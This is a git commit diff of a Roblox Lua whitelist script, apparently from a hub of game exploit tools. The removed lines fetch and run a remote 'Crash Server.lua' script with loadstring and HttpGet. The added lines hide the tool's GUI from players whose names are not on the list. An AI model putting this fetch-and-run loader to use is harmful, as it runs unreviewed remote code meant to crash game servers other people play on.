0ed221ab5bbd0687708ff40017cddf6a7d89044b
Kero.exe <100468878+Kerutzuu@users.noreply.github.com>
2025-08-22 09:07:15 +0200

    Update Whitelist.lua

--- Whitelist.lua
+++ Whitelist.lua
@@ -1,3 +1,22 @@
-script.Parent.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kerutzuu/Scripturi-TNTHUB/refs/heads/main/Crash%20Server.lua", true))()
-end)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local allowedUsernames = {
+	"alexandru123852",
+	"VreauC7",
+	"YourUsername3"
+}
+
+local gui = script.Parent
+
+local function isPlayerAllowed()
+	for _, name in ipairs(allowedUsernames) do
+		if player.Name == name then
+			return true
+		end
+	end
+	return false
+end
+
+if not isPlayerAllowed() then
+	gui.Enabled = false
+end
